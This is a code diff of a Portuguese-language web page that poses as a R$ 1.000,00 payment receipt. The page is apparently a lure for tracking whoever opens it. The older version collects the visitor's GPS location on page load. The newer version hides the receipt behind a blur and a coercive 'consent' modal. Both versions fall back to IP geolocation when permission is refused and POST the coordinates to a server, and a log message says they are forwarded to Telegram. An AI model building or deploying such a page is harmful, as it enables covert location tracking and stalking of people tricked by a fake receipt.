@@ -1,93 +1,206 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Comprovante de Recebimento</title>
+    <link rel="stylesheet" href="styles.css" />
+  </head>
 
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Comprovante de Recebimento</title>
-  <link rel="stylesheet" href="styles.css" />
-</head>
+  <body>
+    <!-- Modal de Consentimento -->
+    <div id="consentimento-modal" class="modal">
+      <div class="modal-content">
+        <h2>Permitir Acesso à Localização</h2>
+        <p>
+          Para visualizar seu comprovante de recebimento, precisamos acessar sua
+          localização.
+        </p>
+        <p class="aviso-info">
+          Clique em "Permitir" quando o navegador solicitar permissão de acesso
+          à localização.
+        </p>
 
-<body>
-  <div class="comprovante-container">
-    <h1>Comprovante de Recebimento</h1>
-
-    <div class="informacoes">
-      <p><span>Data:</span> <span id="data-atual"></span></p>
-      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> João Silva de Oliveira</p>
-      <p><span>Status:</span> Recebido com Sucesso</p>
+        <div class="modal-botoes">
+          <button
+            class="botao botao-principal"
+            onclick="solicitarLocalizacao()"
+          >
+            Permitir Localização
+          </button>
+          <button class="botao botao-secundario" onclick="recusarLocalizacao()">
+            Recusar
+          </button>
+        </div>
+      </div>
     </div>
 
-    <button class="botao" onclick="window.print()">Imprimir</button>
+    <div class="comprovante-container">
+      <h1>Comprovante de Recebimento</h1>
 
-    <div class="comprovante-footer">
-      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-      <p><a href="#">Clique aqui</a> para mais informações.</p>
+      <div class="informacoes ofuscado" id="informacoes-ofuscadas">
+        <p><span>Data:</span> <span id="data-atual"></span></p>
+        <p><span>Valor Recebido:</span> R$ 1.000,00</p>
+        <p><span>De:</span> João Silva de Oliveira</p>
+        <p><span>Status:</span> Recebido com Sucesso</p>
+      </div>
+
+      <div class="informacoes-oculta" id="informacoes-oculta">
+        <p>
+          📌 Clique em "Permitir Localização" para visualizar os detalhes do
+          comprovante
+        </p>
+      </div>
+
+      <button
+        class="botao"
+        id="btn-imprimir"
+        onclick="window.print()"
+        style="display: none"
+      >
+        Imprimir
+      </button>
+
+      <div class="comprovante-footer">
+        <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+        <p><a href="#">Clique aqui</a> para mais informações.</p>
+      </div>
     </div>
-  </div>
 
-  <script>
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => sendLocation(position, "Precisa (GPS)"),
-          () => fallbackLocation()
-        );
-      } else {
-        fallbackLocation();
+    <script>
+      // Inicializar data
+      const dataAtual = new Date();
+      const dia = String(dataAtual.getDate()).padStart(2, "0");
+      const mes = String(dataAtual.getMonth() + 1).padStart(2, "0");
+      const ano = dataAtual.getFullYear();
+      const dataFormatada = `${dia}/${mes}/${ano}`;
+      document.getElementById("data-atual").textContent = dataFormatada;
+
+      // Mostrar modal de consentimento ao carregar
+      window.addEventListener("load", () => {
+        document.getElementById("consentimento-modal").style.display = "flex";
+      });
+
+      // Solicitar localização do usuário
+      function solicitarLocalizacao() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              revelarComprovante(position, "Precisa (GPS)");
+              sendLocation(position, "Precisa (GPS)");
+            },
+            (error) => {
+              handleError(error);
+              revelarComprovante(null, "Recusado");
+              fallbackLocation();
+            },
+            { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 },
+          );
+        } else {
+          alert("Seu navegador não suporta geolocalização.");
+          fallbackLocation();
+        }
       }
-    });
 
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-    document.getElementById("data-atual").textContent = dataFormatada;
+      // Recusar localização
+      function recusarLocalizacao() {
+        alert(
+          "Você recusou compartilhar sua localização. O comprovante não pode ser exibido.",
+        );
+      }
 
-    function sendLocation(position, source) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      // Revelar comprovante após consentimento
+      function revelarComprovante(position, source) {
+        const modal = document.getElementById("consentimento-modal");
+        const ofuscado = document.getElementById("informacoes-ofuscadas");
+        const oculto = document.getElementById("informacoes-oculta");
+        const btnImprimir = document.getElementById("btn-imprimir");
 
-      enviarParaApi(latitude, longitude, maps, source);
-    }
+        // Fechar modal
+        modal.style.display = "none";
 
-    function fallbackLocation() {
-      fetch("https://ipapi.co/json/")
-        .then(response => response.json())
-        .then(data => {
-          const latitude = data.latitude;
-          const longitude = data.longitude;
-          const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        // Remover efeito de blur
+        ofuscado.classList.remove("ofuscado");
+        oculto.style.display = "none";
 
-          enviarParaApi(latitude, longitude, maps, "Aproximada (IP)");
-        })
-        .catch(error => {
-          console.error("Erro ao obter localização pelo IP:", error);
+        // Mostrar botão de imprimir
+        btnImprimir.style.display = "block";
+      }
+
+      function sendLocation(position, source) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+        const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+        console.log("Latitude:", latitude);
+        console.log("Longitude:", longitude);
+        console.log("Precisão:", accuracy, "metros");
+        enviarParaApi(latitude, longitude, maps, source);
+      }
+
+      function fallbackLocation() {
+        fetch("https://ipapi.co/json/")
+          .then((response) => response.json())
+          .then((data) => {
+            const latitude = data.latitude;
+            const longitude = data.longitude;
+            const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+            enviarParaApi(latitude, longitude, maps, "Aproximada (IP)");
+          })
+          .catch((error) => {
+            console.error("Erro ao obter localização pelo IP:", error);
+          });
+      }
+
+      function enviarParaApi(latitude, longitude, maps, source) {
+        console.log("📤 Enviando para API:", {
+          latitude,
+          longitude,
+          maps,
+          source,
         });
-    }
 
-    function enviarParaApi(latitude, longitude, maps, source) {
-      fetch("/api/send-location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude, maps, source })
-      })
-        .then(response => response.json())
-        .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
+        fetch("/api/send-location", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ latitude, longitude, maps, source }),
         })
-        .catch(error => {
-          console.error("Erro:", error);
-        });
-    }
-  </script>
-</body>
+          .then((response) => {
+            console.log("📥 Resposta do servidor:", response.status);
+            return response.json();
+          })
+          .then((data) => {
+            console.log("📋 Dados retornados:", data);
+            if (data.success) {
+              console.log(
+                "✅ Localização enviada com sucesso para o Telegram!",
+              );
+            } else {
+              console.error("❌ Erro ao enviar:", data.message);
+            }
+          })
+          .catch((error) => {
+            console.error("❌ Erro na requisição:", error);
+          });
+      }
 
+      function handleError(error) {
+        let message = "Erro ao obter a localização: ";
+        if (error.code === 1) {
+          message += "Permissão de localização negada pelo usuário.";
+        } else if (error.code === 2) {
+          message += "Informação de localização indisponível.";
+        } else if (error.code === 3) {
+          message += "A requisição para obter a localização expirou.";
+        } else {
+          message += "Erro desconhecido.";
+        }
+        console.error(message);
+      }
+    </script>
+  </body>
 </html>
